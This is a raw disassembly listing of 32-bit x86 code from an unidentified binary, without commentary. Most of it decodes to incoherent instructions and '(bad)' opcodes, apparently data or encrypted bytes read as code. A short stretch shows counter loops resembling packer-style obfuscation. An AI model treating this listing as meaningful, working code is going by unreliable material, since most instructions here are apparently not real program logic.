  40a7c1:	mov    dl,0xdb
  40a7c3:	test   eax,0xbe2521e8
  40a7c8:	out    0x22,eax
  40a7ca:	adc    DWORD PTR [esi],edi
  40a7cc:	mov    DWORD PTR [edx-0x4860ded0],ebp
  40a7d2:	mov    bl,0xc
  40a7d4:	add    al,0x20
  40a7d6:	or     eax,0x726ae6ed
  40a7db:	pop    es
  40a7dc:	in     eax,0xb3
  40a7de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7df:	add    al,0xb1
  40a7e1:	and    dh,BYTE PTR [ebp+ecx*8-0x4436bb35]
  40a7e8:	sti    
  40a7e9:	loope  0x40a7af
  40a7eb:	cli    
  40a7ec:	sbb    edi,eax
  40a7ee:	fldenv [edi]
  40a7f0:	in     eax,dx
  40a7f1:	int    0x8b
  40a7f3:	mov    DWORD PTR [ecx+0x480bed88],0x3d7ed3f4
  40a7fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7fe:	ins    DWORD PTR es:[edi],dx
  40a7ff:	stc    
  40a800:	iret   
  40a801:	sub    BYTE PTR [edi],al
  40a803:	sti    
  40a804:	int    0x43
  40a806:	sti    
  40a807:	inc    ecx
  40a808:	repnz fwait
  40a80a:	or     edx,DWORD PTR [ebp+0x58c96ee4]
  40a810:	int3   
  40a811:	cmp    al,0x25
  40a813:	xlat   BYTE PTR ds:[ebx]
  40a814:	sub    al,0x8f
  40a816:	pop    ds
  40a817:	sbb    BYTE PTR [edi+ebp*2+0x2e],0xfa
  40a81c:	cmp    ecx,DWORD PTR [edx]
  40a81e:	mov    esp,0xccc35e8d
  40a823:	gs adc ecx,ecx
  40a826:	xor    al,0x90
  40a828:	xor    al,ch
  40a82a:	call   0xf8e8d317
  40a82f:	or     ecx,DWORD PTR [eax+0x61e593ea]
  40a835:	(bad)  
  40a836:	sahf   
  40a837:	mov    ds:0xa6618c7f,eax
  40a83c:	fwait
  40a83d:	bound  eax,QWORD PTR [edx+0x33f52e22]
  40a843:	and    eax,0x1bb86432
  40a848:	dec    esi
  40a849:	in     eax,dx
  40a84a:	inc    ecx
  40a84b:	in     al,0x70
  40a84d:	stc    
  40a84e:	jnp    0x40a89b
  40a850:	adc    edi,edx
  40a852:	add    edi,esi
  40a854:	push   ebp
  40a855:	test   al,0x78
  40a857:	mov    ss,WORD PTR [ebx+eiz*4+0x72f3967b]
  40a85e:	nop
  40a85f:	mov    ecx,0x2483596d
  40a864:	xor    BYTE PTR [eax],0x72
  40a867:	lds    edi,FWORD PTR [ecx+0x7]
  40a86a:	outs   dx,BYTE PTR ds:[esi]
  40a86b:	push   ss
  40a86c:	ins    DWORD PTR es:[edi],dx
  40a86d:	nop
  40a86e:	xchg   ecx,eax
  40a86f:	out    0x96,al
  40a871:	add    eax,ebp
  40a873:	pusha  
  40a874:	scas   eax,DWORD PTR es:[edi]
  40a875:	test   DWORD PTR [ebx],0x37ed904f
  40a87b:	and    esp,DWORD PTR ds:0xc41ed2fe
  40a881:	test   ebx,0x77da3e9c
  40a887:	mov    ebx,0x48d064e5
  40a88c:	addr16 out 0xe0,al
  40a88f:	sub    BYTE PTR [esi],bl
  40a891:	jne    0x40a8c3
  40a893:	cmp    al,dl
  40a895:	shl    DWORD PTR [esi+ebx*1],0xd5
  40a899:	fsub   QWORD PTR [ecx+0x493f81df]
  40a89f:	mov    ebx,0xd5dc3e9c
  40a8a4:	pusha  
  40a8a5:	xchg   edi,eax
  40a8a6:	rcr    BYTE PTR ds:0xcb812f87,cl
  40a8ac:	xor    eax,DWORD PTR [eax]
  40a8ae:	cmc    
  40a8af:	stos   BYTE PTR es:[edi],al
  40a8b0:	ss es push edx
  40a8b3:	xor    dh,BYTE PTR [edx]
  40a8b5:	nop
  40a8b6:	jecxz  0x40a843
  40a8b8:	or     BYTE PTR [edi-0x58],bh
  40a8bb:	(bad)  
  40a8bc:	mov    bh,0x7d
  40a8be:	sbb    al,dl
  40a8c0:	lods   eax,DWORD PTR ds:[esi]
  40a8c1:	aam    0xfb
  40a8c3:	mov    edi,0x50c71ece
  40a8c8:	or     cl,BYTE PTR [ecx]
  40a8ca:	bound  esp,QWORD PTR ss:[edi-0x1aed9030]
  40a8d1:	mov    ch,0x7
  40a8d3:	sub    cl,BYTE PTR [edi]
  40a8d5:	rcr    DWORD PTR [eax-0x70],0x57
  40a8d9:	push   ebx
  40a8da:	xchg   BYTE PTR [eax+ecx*8-0x2c4dc187],dl
  40a8e1:	jbe    0x40a8ae
  40a8e3:	mov    esp,0x92a566fc
  40a8e8:	mov    edi,0x2351ff85
  40a8ed:	pushw  0x1d
  40a8f0:	sbb    al,0xbc
  40a8f2:	pushf  
  40a8f3:	or     al,0xd0
  40a8f5:	jne    0x40a8d2
  40a8f7:	fcmovnb st,st(1)
  40a8f9:	sub    al,al
  40a8fb:	push   esp
  40a8fc:	push   ds
  40a8fd:	and    al,cl
  40a8ff:	ins    BYTE PTR es:[edi],dx
  40a900:	xchg   ebp,eax
  40a901:	(bad)  
  40a903:	not    eax
  40a905:	fcomp  QWORD PTR [eax+0x9]
  40a908:	pop    ecx
  40a909:	xlat   BYTE PTR es:[ebx]
  40a90b:	sub    eax,0xfcdd5457
  40a910:	clc    
  40a911:	sbb    eax,0x5369fbd6
  40a916:	pushf  
  40a917:	into   
  40a918:	mov    cl,0x78
  40a91a:	mov    DWORD PTR [esi+0x5991bb1e],eax
  40a920:	mul    BYTE PTR [edx-0x58]
  40a923:	and    esi,esi
  40a925:	je     0x40a90f
  40a927:	cmp    esi,DWORD PTR [ebp+0x14]
  40a92a:	push   esp
  40a92b:	aad    0x4a
  40a92d:	ret    0xfd8c
  40a930:	cli    
  40a931:	int    0x55
  40a933:	xchg   esp,eax
  40a934:	(bad)  
  40a935:	jp     0x40a8bf
  40a937:	dec    edx
  40a938:	mov    ss,WORD PTR [edx-0x5d]
  40a93b:	or     DWORD PTR [eax+0x2c],esi
  40a93e:	xlat   BYTE PTR ds:[ebx]
  40a93f:	mov    esi,DWORD PTR ds:[ecx+0x7f0bac7b]
  40a946:	xchg   esp,eax
  40a947:	dec    esi
  40a948:	adc    BYTE PTR [edi+0x50],dl
  40a94b:	xor    BYTE PTR ds:0xa83c64c3,ah
  40a951:	outs   dx,DWORD PTR ds:[esi]
  40a952:	shl    edi,1
  40a954:	cmc    
  40a955:	add    dl,BYTE PTR [ecx+0x4fcba344]
  40a95b:	daa    
  40a95c:	cmp    BYTE PTR [ecx],dl
  40a95e:	aas    
  40a95f:	adc    ebp,DWORD PTR [ecx]
  40a961:	inc    esp
  40a962:	aaa    
  40a963:	push   0xffffffad
  40a965:	dec    edx
  40a966:	xor    DWORD PTR [esp+esi*2+0x476c53b0],ebx
  40a96d:	into   
  40a96e:	xchg   BYTE PTR [ebx+eax*4+0x4d],cl
  40a972:	test   BYTE PTR ds:0x17155b96,al
  40a978:	dec    edx
  40a979:	ret    0xba06
  40a97c:	push   esi
  40a97d:	add    DWORD PTR [eax],ebp
  40a97f:	shl    BYTE PTR [edx+0x38],0xa2
  40a983:	xchg   ebx,eax
  40a984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a985:	test   al,0xf0
  40a987:	lods   al,BYTE PTR fs:[esi]
  40a989:	stos   DWORD PTR es:[edi],eax
  40a98a:	sbb    BYTE PTR [ebp+esi*8+0x6b],dl
  40a98e:	adc    al,0x97
  40a990:	mov    cl,0x56
  40a992:	or     DWORD PTR ds:0x432e7f,0x7ae1
  40a99c:	mov    esi,0x75108af
  40a9a1:	xor    eax,esi
  40a9a3:	push   edi
  40a9a4:	and    edi,0x47d2
  40a9aa:	mov    edi,0x3272f6
  40a9af:	and    DWORD PTR ds:0x432e57,0xe9
  40a9b9:	add    eax,edi
  40a9bb:	mov    DWORD PTR [ebp-0x1c],eax
  40a9be:	mov    eax,DWORD PTR [ebp+0x14]
  40a9c1:	adc    DWORD PTR ds:0x432e97,0x7644
  40a9cb:	test   eax,eax
  40a9cd:	je     0x40aa21
  40a9d3:	and    DWORD PTR ds:0x432e83,0x0
  40a9dd:	mov    eax,ds:0x432e83
  40a9e2:	inc    eax
  40a9e3:	mov    ds:0x432e83,eax
  40a9e8:	cmp    DWORD PTR ds:0x432e83,0x1e
  40a9ef:	jl     0x40aa18
  40a9f5:	jmp    0x40aa0b
  40a9fa:	push   DWORD PTR [ebp-0x24]
  40a9fd:	push   0x432e43
  40aa02:	push   DWORD PTR [ebp-0x10]
  40aa05:	call   DWORD PTR ds:0x43fdff
  40aa0b:	cmp    DWORD PTR ds:0x432e83,0x17
  40aa12:	jb     0x40a9dd
  40aa18:	mov    eax,DWORD PTR [ebp+0x14]
  40aa1b:	mov    eax,DWORD PTR [eax]
  40aa1d:	dec    ebx
  40aa1e:	mov    DWORD PTR [ebp-0x1c],eax
  40aa21:	mov    eax,DWORD PTR [ebp-0x4]
  40aa24:	xor    DWORD PTR ds:0x432e2b,0x506a
  40aa2e:	xor    eax,esi
  40aa30:	and    DWORD PTR ds:0x432e7f,edi
  40aa36:	add    eax,edi
  40aa38:	mov    DWORD PTR [ebp-0x8],eax
  40aa3b:	mov    DWORD PTR ds:0x432e97,0x1e
  40aa45:	cmp    DWORD PTR ds:0x432e97,0x0
  40aa4c:	je     0x40aa81
  40aa52:	cmp    DWORD PTR ds:0x432e97,0x20
  40aa59:	jg     0x40aa81
  40aa5f:	jmp    0x40aa6f
  40aa64:	push   0x4321a7
  40aa69:	call   DWORD PTR ds:0x43fdcb
  40aa6f:	mov    ebx,DWORD PTR ds:0x432e97
  40aa75:	dec    ebx
  40aa76:	mov    DWORD PTR ds:0x432e97,ebx
  40aa7c:	jmp    0x40aa45
  40aa81:	mov    eax,DWORD PTR [ebp-0xc]
  40aa84:	add    DWORD PTR ds:0x432eaf,edx
  40aa8a:	xor    eax,esi
  40aa8c:	add    eax,edi
  40aa8e:	mov    ebx,DWORD PTR ds:0x4392fb
  40aa94:	mov    ebx,DWORD PTR [ebx]
  40aa96:	or     DWORD PTR ds:0x432ebb,ebx
  40aa9c:	mov    DWORD PTR [ebp-0x24],eax
  40aa9f:	and    DWORD PTR ds:0x432e27,0x0
  40aaa9:	jmp    0x40aabb
  40aaae:	mov    ebx,DWORD PTR ds:0x432e27
  40aab4:	inc    ebx
  40aab5:	mov    DWORD PTR ds:0x432e27,ebx
  40aabb:	cmp    DWORD PTR ds:0x432e27,0x13
  40aac2:	jae    0x40ce99
  40aac8:	cmp    DWORD PTR ds:0x432e27,0x18
  40aacf:	jle    0x40ce99
  40aad5:	jmp    0x40aae5
  40aada:	push   0x432173
  40aadf:	call   DWORD PTR ds:0x43fdcf
  40aae5:	jmp    0x40aaae
  40aaea:	jmp    0x40ce99
  40aaef:	dec    edx
  40aaf0:	shr    ah,1
  40aaf2:	shl    esp,0x9d
  40aaf5:	push   es
  40aaf6:	mov    bl,dl
  40aaf8:	adc    BYTE PTR [edx+0x6f],bh
  40aafb:	ja     0x40aa94
  40aafd:	(bad)  
  40ab00:	test   BYTE PTR [ebx-0x7c9f0e7d],0x83
  40ab07:	test   ah,cl
  40ab09:	mov    eax,ds:0xac659018
  40ab0e:	pop    ebx
  40ab0f:	retf   0x71f7
  40ab12:	and    al,0x7
  40ab14:	lea    esi,[edi+0x1a]
  40ab17:	iret   
  40ab18:	jg     0x40ab42
  40ab1a:	and    DWORD PTR [esp+ecx*1-0x2ddca43a],0xf6fbf9a8
  40ab25:	les    edx,FWORD PTR [ecx+ebp*2-0x67]
  40ab29:	pushf  
  40ab2a:	iret   
  40ab2b:	mov    ah,0x2a
  40ab2d:	adc    BYTE PTR [edi+0x57b76ed3],dl
  40ab33:	fwait
  40ab34:	jmp    0xe093d83e
  40ab39:	mov    ebp,DWORD PTR [ebx]
  40ab3b:	mov    ds:0xce54b29f,eax
  40ab40:	repnz xchg esp,eax
  40ab42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab43:	in     eax,dx
  40ab44:	or     ch,cl
  40ab46:	pusha  
  40ab47:	mov    cl,0xc5
  40ab49:	pop    ss
  40ab4a:	out    0x17,eax
  40ab4c:	inc    ebp
  40ab4d:	pop    esp
  40ab4e:	push   0x3eabc614
  40ab53:	scas   eax,DWORD PTR es:[edi]
  40ab54:	test   esi,edx
  40ab56:	out    dx,eax
  40ab57:	cli    
  40ab58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab59:	lods   eax,DWORD PTR ds:[esi]
  40ab5a:	cmp    al,0xbe
  40ab5c:	addr16 ds daa 
  40ab5f:	mov    dl,0x24
  40ab61:	mov    fs,WORD PTR es:[ebx-0x3b]
  40ab65:	les    ecx,FWORD PTR [edx-0x1734f282]
  40ab6b:	xlat   BYTE PTR ds:[ebx]
  40ab6c:	rcl    DWORD PTR [edx+0x6a],0x84
  40ab70:	in     al,dx
  40ab71:	sbb    dh,BYTE PTR [edi-0x76]
  40ab74:	lahf   
  40ab75:	jo     0x40ab1c
  40ab77:	leave  
  40ab78:	inc    edx
  40ab79:	aaa    
  40ab7a:	outs   dx,DWORD PTR ds:[esi]
  40ab7b:	xor    dh,dh
  40ab7d:	mov    DWORD PTR [edi-0x112fdf47],ebp
  40ab83:	idiv   BYTE PTR [esi-0x26]
  40ab86:	(bad)  
  40ab87:	cli    
  40ab88:	pop    es
  40ab89:	push   ds
  40ab8a:	push   cs
  40ab8b:	call   0xc9899319
  40ab90:	sbb    dl,ch
  40ab92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab93:	xchg   esp,eax
  40ab94:	add    dl,dh
  40ab96:	xchg   edx,eax
  40ab97:	mov    ds:0x1ff401a,al
  40ab9c:	ror    DWORD PTR [esi],1
  40ab9e:	enter  0xb007,0x1
  40aba2:	mov    ebp,0x9ebb1cd0
  40aba7:	je     0x40abe5
  40aba9:	mov    al,BYTE PTR [edi+0x50b89458]
  40abaf:	push   0x49
  40abb1:	pop    eax
  40abb2:	pop    ebx
  40abb3:	es aas 
  40abb5:	and    eax,0x9881d385
  40abba:	jnp    0x40aba5
  40abbc:	and    DWORD PTR [ebx+0x6f],ebp
  40abbf:	mov    ds:0x21357713,eax
  40abc4:	mov    al,BYTE PTR [ebp-0x586890d3]
  40abca:	pusha  
  40abcb:	loopne 0x40abeb
  40abcd:	and    eax,0xa5d65207
  40abd2:	mov    gs,edi
  40abd4:	jns    0x40ab74
  40abd6:	cdq    
  40abd7:	xchg   BYTE PTR [edi-0x56],al
  40abda:	or     bh,BYTE PTR [edi]
  40abdc:	adc    al,0x80
  40abde:	mov    esi,0xd290c782
  40abe3:	fcom   QWORD PTR [edx]
  40abe5:	jecxz  0x40abbf
  40abe7:	test   edi,ebp
  40abe9:	sbb    eax,0x707e0fba
  40abee:	adc    al,0xb0
  40abf0:	aad    0x1a
  40abf2:	or     DWORD PTR ds:[ecx-0x5b],0xffffffd0
  40abf7:	ss push ss
  40abf9:	(bad)  
  40abfa:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40abfc:	pushf  
  40abfd:	cmp    al,0xd
  40abff:	push   ecx
  40ac00:	in     eax,0xc9
  40ac02:	push   ebp
  40ac03:	enter  0xad58,0x9f
  40ac07:	mov    BYTE PTR [edi+0x5d],cl
  40ac0a:	rol    BYTE PTR [esi-0x3d7878de],1
  40ac10:	cvtdq2ps xmm0,XMMWORD PTR [ebp+0x45c710e6]
  40ac17:	dec    esp
  40ac18:	xlat   BYTE PTR ds:[ebx]
  40ac19:	repz in al,0x89
  40ac1c:	loop   0x40abb8
  40ac1e:	or     al,0xe4
  40ac20:	mov    ebp,0xc22419ef
  40ac25:	xor    cl,ch
  40ac27:	jno    0x40abcd
  40ac29:	es (bad) 
  40ac2b:	jbe    0x40ac30
  40ac2d:	sub    ch,BYTE PTR [eax+edi*4]
  40ac30:	mov    ah,BYTE PTR [ebx-0x43ddb36a]
  40ac36:	in     eax,0xcf
  40ac38:	cld    
  40ac39:	inc    edi
  40ac3a:	pop    esi
  40ac3b:	pop    ebx
  40ac3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac3d:	pop    esi
  40ac3e:	sub    eax,0x23b95bbb
  40ac43:	push   ecx
  40ac44:	arpl   dx,bp
  40ac46:	lds    esp,FWORD PTR [ebx+0x6a0be093]
  40ac4c:	sub    cl,BYTE PTR [edx+0x58]
  40ac4f:	mov    ch,0x31
  40ac51:	into   
  40ac52:	and    BYTE PTR [eax-0x444c71b7],cl
  40ac58:	pop    edx
  40ac59:	sub    BYTE PTR [ebp+ebp*2+0x57],ch
  40ac5d:	cmp    DWORD PTR [ecx+0x69],0x1db7205a
  40ac64:	jns    0x40acc1
  40ac66:	push   es
  40ac67:	aam    0xd1
  40ac69:	sbb    al,0x9c
  40ac6b:	ret    0x1701
  40ac6e:	out    dx,eax
  40ac6f:	in     al,dx
  40ac70:	adc    al,0xb7
  40ac72:	jp     0x40ac78
  40ac74:	dec    esi
  40ac75:	mov    esp,0x17c00f3e
  40ac7a:	dec    DWORD PTR [ebp+eax*2+0x5]
  40ac7e:	shr    ch,0xd7
  40ac81:	ret    
  40ac82:	cld    
  40ac83:	or     eax,0x46e691fa
  40ac88:	or     BYTE PTR [ecx],dl
  40ac8a:	or     eax,0xba576e26
  40ac8f:	mov    esi,0xd23835f8
  40ac94:	or     dh,ah
  40ac96:	dec    esp
  40ac97:	out    dx,eax
  40ac98:	in     eax,dx
  40ac99:	ss sti 
  40ac9b:	pop    esp
  40ac9c:	dec    edx
  40ac9d:	add    ebp,DWORD PTR [edx+0x3d]
  40aca0:	inc    edx
  40aca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aca2:	mov    ch,0x90
  40aca4:	jno    0x40ac85
  40aca6:	mov    ds:0x91cd7375,eax
  40acab:	cld    
  40acac:	push   ecx
  40acad:	les    esi,FWORD PTR [ecx-0x35]
  40acb0:	push   ecx
  40acb1:	(bad)  
  40acb2:	jbe    0x40ad16
  40acb4:	imul   esi,DWORD PTR [ebp+0x1],0x37dc681f
  40acbb:	or     ebp,DWORD PTR [ebx-0x53]
  40acbe:	rol    DWORD PTR [ebx-0x1f],0xb7
  40acc2:	inc    ebx
  40acc3:	into   
  40acc4:	dec    ebx
  40acc5:	mov    esp,DWORD PTR [ebp+0x53]
  40acc8:	inc    edi
  40acc9:	addr16 adc al,0x96
  40accc:	cwde   
  40accd:	aad    0xe6
  40accf:	add    BYTE PTR [ebx-0x1d7d1667],ch
  40acd5:	loop   0x40ad04
  40acd7:	je     0x40ac96
  40acd9:	in     eax,dx
  40acda:	jecxz  0x40ac5e
  40acdc:	mov    esi,ebp
  40acde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acdf:	mov    WORD PTR [esi+ecx*8+0x7d4a6ae6],cs
  40ace6:	sbb    eax,0xa633f804
  40aceb:	(bad)  
  40acec:	cmp    al,0x4f
  40acee:	fiadd  WORD PTR [ebx+0x13b1cc88]
  40acf4:	inc    ebp
  40acf5:	stc    
  40acf6:	dec    ecx
  40acf7:	jb     0x40ac9b
  40acf9:	and    eax,0x65ebd27
  40acfe:	ss cmp al,0x7b
  40ad01:	jle    0x40aca6
  40ad03:	mov    BYTE PTR [ecx],0xc5
  40ad06:	sub    DWORD PTR [esi+edi*1-0x59],0x53b029fe
  40ad0e:	ret    0xada
  40ad11:	ret    0x7fea
  40ad14:	ss add ch,bh
  40ad17:	outs   dx,BYTE PTR ds:[esi]
  40ad18:	ja     0x40ad1f
  40ad1a:	into   
  40ad1b:	imul   DWORD PTR [esi]
  40ad1d:	test   DWORD PTR [ecx-0x278fc8ee],edx
  40ad23:	ds lahf 
  40ad25:	cmp    cl,cl
  40ad27:	dec    edi
  40ad28:	inc    ebx
  40ad29:	mov    bl,0xbb
  40ad2b:	or     al,0xa5
  40ad2d:	xor    al,0x11
  40ad2f:	mov    esi,0xf2a14dc0
  40ad34:	mov    dh,0xc
  40ad36:	jle    0x40ad0a
  40ad38:	mov    cl,0xf1
  40ad3a:	ficomp WORD PTR [ebp-0x6a]
  40ad3d:	aad    0xa
  40ad3f:	cmp    bh,0xa0
  40ad42:	mov    edi,0xe2255163
  40ad47:	sbb    ch,BYTE PTR [ebx]
  40ad49:	adc    DWORD PTR [edx+0x1dcb5baa],ecx
  40ad4f:	cld    
  40ad50:	adc    al,0xa5
  40ad52:	xchg   esp,eax
  40ad53:	inc    eax
  40ad54:	inc    ebp
  40ad55:	mov    edi,0xd66fe4e1
  40ad5a:	int    0x2a
  40ad5c:	cmp    esp,DWORD PTR [esp+esi*1-0x5d9e4b60]
  40ad63:	aaa    
  40ad64:	cmp    al,0x92
  40ad66:	pop    eax
  40ad67:	test   al,0xab
  40ad69:	ret    0xb706
  40ad6c:	jnp    0x40adbf
  40ad6e:	aam    0x24
  40ad70:	mov    ebp,0x4ef8076a
  40ad76:	mov    dh,dl
  40ad78:	sbb    eax,0xa12e6ef
  40ad7d:	mov    ecx,0x125e6b0
  40ad82:	es dec edx
  40ad84:	lods   eax,DWORD PTR ds:[esi]
  40ad85:	lahf   
  40ad86:	arpl   WORD PTR [edi+0x13],cx
  40ad89:	xchg   edx,eax
  40ad8a:	push   cs
  40ad8b:	pop    eax
  40ad8c:	xchg   edi,eax
  40ad8d:	ret    0xe492
  40ad90:	mov    eax,0xe05da78a
  40ad95:	(bad)  [eax-0x34]
  40ad98:	daa    
  40ad99:	test   al,0x3
  40ad9b:	mov    edi,0xc0865e2d
  40ada0:	xor    DWORD PTR [edx+0x1dfb0275],ebx
  40ada6:	adc    ch,bl
  40ada8:	call   0x3e70196
  40adad:	(bad)  [edi+0x4d92961f]
  40adb3:	pop    ds
  40adb4:	add    DWORD PTR [edi-0x2fc38a09],ebp
  40adba:	es jo  0x40adfb
  40adbd:	adc    esp,edi
  40adbf:	les    ebp,FWORD PTR [edx+0x49812a86]
  40adc5:	fisttp QWORD PTR [esi-0xe]
  40adc8:	in     eax,dx
  40adc9:	mov    DWORD PTR ds:0xc9766a4,esp
  40adcf:	pop    esi
  40add0:	repnz mov edx,0xa8f2ee9
  40add6:	imul   eax,DWORD PTR [ebx-0x6d9d34f7],0x66bcfb53
  40ade0:	mov    esp,DWORD PTR [ebx+ebx*2+0x18]
  40ade4:	jns    0x40ae2c
  40ade6:	pop    ecx
  40ade7:	adc    DWORD PTR [edx],0x56f9ab9e
  40aded:	call   0x33f3bc2c
  40adf2:	call   0x193e:0x3feefad2
  40adf9:	inc    esp
  40adfa:	xor    al,0xbd
  40adfc:	(bad)  
  40adfd:	push   ebp
  40adfe:	jge    0x40ae38
  40ae00:	mov    cl,0xe3
  40ae02:	mov    eax,ds:0x8c418f7b
  40ae07:	cmp    edi,edi
  40ae09:	xor    DWORD PTR [eax+0x3],edi
  40ae0c:	xchg   ebp,eax
  40ae0d:	scas   eax,DWORD PTR es:[edi]
  40ae0e:	retf   
  40ae0f:	fsubr  DWORD PTR [ebp+ecx*2+0x31a84176]
  40ae16:	mov    bl,0xe3
  40ae18:	cwde   
  40ae19:	mov    WORD PTR [ecx-0x228353f6],es
  40ae1f:	dec    ebp
  40ae20:	mov    ecx,0x6943d130
  40ae25:	sti    
  40ae26:	dec    edx
  40ae27:	aas    
  40ae28:	push   0xb
  40ae2a:	clc    
  40ae2b:	mov    edi,0x291ff6b8
  40ae30:	fisttp WORD PTR [edi+0x15]
  40ae33:	mov    dh,0x2c
  40ae35:	out    0xbb,eax
  40ae37:	ja     0x40ae06
  40ae39:	(bad)  
  40ae3a:	in     eax,dx
  40ae3b:	xchg   esp,eax
  40ae3c:	std    
  40ae3d:	inc    edi
  40ae3e:	out    dx,eax
  40ae3f:	repz mov ?,WORD PTR ds:0xa340f811
  40ae46:	mov    cl,0x4a
  40ae48:	pop    eax
  40ae49:	aaa    
  40ae4a:	dec    ebx
  40ae4b:	fisttp DWORD PTR [edi-0x80]
  40ae4e:	inc    ebp
  40ae4f:	mov    fs,WORD PTR [esi]
  40ae51:	xor    bl,dh
  40ae53:	xchg   esi,eax
  40ae54:	or     ah,BYTE PTR [edx]
  40ae56:	and    DWORD PTR [eax-0x4fe7bacf],esi
  40ae5c:	fnsave [ecx]
  40ae5e:	jle    0x40ae6a
  40ae60:	add    al,0x2e
  40ae62:	xor    eax,eax
  40ae64:	or     ah,bl
  40ae66:	jmp    0x40adf3
  40ae68:	xchg   esi,eax
  40ae69:	fdivr  DWORD PTR [edx-0x77]
  40ae6c:	pop    esi
  40ae6d:	mov    dh,BYTE PTR [eax-0x4740795e]
  40ae73:	int    0xfd
  40ae75:	jg     0x40ae49
  40ae77:	ds pop ebx
  40ae79:	pop    esi
  40ae7a:	adc    bh,bh
  40ae7c:	jne    0x40ae13
  40ae7e:	iret   
  40ae7f:	xor    eax,DWORD PTR [eax+0x66]
  40ae82:	xchg   BYTE PTR [ecx],bh
  40ae84:	add    DWORD PTR [ecx+0x61],0x3c7e7505
  40ae8b:	iret   
  40ae8c:	mov    bh,0xbc
  40ae8e:	mov    dh,0x58
  40ae90:	cmp    al,0x36
  40ae92:	and    DWORD PTR [esi+edx*2-0x59],esp
  40ae96:	loope  0x40ae93
  40ae98:	fs xchg esp,eax
  40ae9a:	push   esp
  40ae9b:	push   esp
  40ae9c:	sub    al,0x10
  40ae9e:	sbb    DWORD PTR [esi-0x3d],edx
  40aea1:	pop    esi
  40aea2:	mov    al,0x5d
  40aea4:	int3   
  40aea5:	shl    DWORD PTR [edx],cl
  40aea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aea8:	fild   WORD PTR [edx-0x36]
  40aeab:	(bad)  
  40aeac:	jmp    0xd645bbe1
  40aeb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeb2:	dec    esp
  40aeb3:	mov    eax,0xa65fa3ce
  40aeb8:	jbe    0x40af36
  40aeba:	xchg   edi,eax
  40aebb:	outs   dx,BYTE PTR ds:[esi]
  40aebc:	xlat   BYTE PTR ds:[ebx]
  40aebd:	loop   0x40af3c
  40aebf:	sub    edi,ebp
  40aec1:	jns    0x40ae82
  40aec3:	retf   
  40aec4:	and    eax,0x7ceabc17
  40aec9:	dec    ebp
  40aeca:	mov    ch,0xad
  40aecc:	leave  
  40aecd:	adc    eax,edx
  40aecf:	mov    esp,DWORD PTR [ecx]
  40aed1:	add    eax,0xd730f68f
  40aed6:	jmp    0x15c7198
  40aedb:	cwde   
  40aedc:	imul   eax,ecx,0x6c
  40aedf:	pop    ds
  40aee0:	scas   eax,DWORD PTR es:[edi]
  40aee1:	xor    BYTE PTR [edx-0x4fe7a80a],bl
  40aee7:	imul   edx,DWORD PTR [ebx-0x869ab30],0xffffff8d
  40aeee:	sbb    eax,0x81a985c3
  40aef3:	rcr    DWORD PTR [ecx+0x1b5db3a],1
  40aef9:	bound  esp,QWORD PTR [edi]
  40aefb:	stc    
  40aefc:	sti    
  40aefd:	mov    ah,0x7d
  40aeff:	fsubr  DWORD PTR [edi+0x21]
  40af02:	push   ecx
  40af03:	adc    cl,BYTE PTR [edx]
  40af05:	push   es
  40af06:	add    eax,0xc7847b51
  40af0b:	fldenv [ebx]
  40af0d:	jg     0x40af52
  40af0f:	call   FWORD PTR [ebp-0xc21eb8a]
  40af15:	adc    DWORD PTR [esi],0xffffffca
  40af18:	daa    
  40af19:	rcr    BYTE PTR [ebx-0x66],1
  40af1c:	jno    0x40aeae
  40af1e:	iret   
  40af1f:	pop    esp
  40af20:	and    eax,DWORD PTR [ecx+0x7a]
  40af23:	cld    
  40af24:	lahf   
  40af25:	push   di
  40af27:	es call 0xe1442726
  40af2d:	jl     0x40aed2
  40af2f:	pop    ds
  40af30:	adc    eax,0xa4ef286e
  40af35:	cli    
  40af36:	inc    esp
  40af37:	inc    edi
  40af38:	mov    bh,0x74
  40af3a:	dec    edi
  40af3b:	cwde   
  40af3c:	cmp    ecx,DWORD PTR [ebp+0x36574767]
  40af42:	mov    WORD PTR [ebp-0x38835a87],?
  40af48:	pop    edx
  40af49:	xor    eax,0xc8803f7d
  40af4e:	nop
  40af4f:	push   eax
  40af50:	mov    ds:0xe8fa15b7,eax
  40af55:	int    0xe3
  40af57:	sub    al,0x82
  40af59:	call   0x783e:0xff991810
  40af60:	jg     0x40afb1
  40af62:	mov    ah,0xe3
  40af64:	ret    
  40af65:	mov    edi,0x77e9452
  40af6a:	aas    
  40af6b:	push   esi
  40af6c:	repz xchg esp,eax
  40af6e:	pop    ebx
  40af6f:	pusha  
  40af70:	shl    ebp,1
  40af72:	repz mov edx,DWORD PTR [edx-0x58d06088]
  40af79:	(bad)  
  40af7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af7b:	enter  0xd7b6,0x58
  40af7f:	out    0x28,eax
  40af81:	fwait
  40af82:	cmp    BYTE PTR [edi-0x43bd73f],dh
  40af88:	add    ebx,DWORD PTR [eax-0x48]
  40af8b:	ins    DWORD PTR es:[edi],dx
  40af8c:	xor    DWORD PTR [ecx-0x68],ebx
  40af8f:	fidivr WORD PTR [ecx+0x75bd8fb7]
  40af95:	or     DWORD PTR [edi-0x475a142],0x48
  40af9c:	repz dec edx
  40af9e:	cmp    BYTE PTR [eax+eax*1+0x6b2144ab],al
  40afa5:	rol    BYTE PTR [esi],cl
  40afa7:	ds and al,0x5
  40afaa:	cli    
  40afab:	cli    
  40afac:	out    0x29,al
  40afae:	js     0x40af37
  40afb0:	and    eax,0x8f1c610d
  40afb5:	int    0xbf
  40afb7:	and    edi,DWORD PTR [edx+0x2682f0b]
  40afbd:	outs   dx,DWORD PTR ds:[esi]
  40afbe:	dec    ebx
  40afbf:	dec    eax
  40afc0:	cmp    BYTE PTR [esi],dl
  40afc2:	popf   
  40afc3:	idiv   BYTE PTR [ecx]
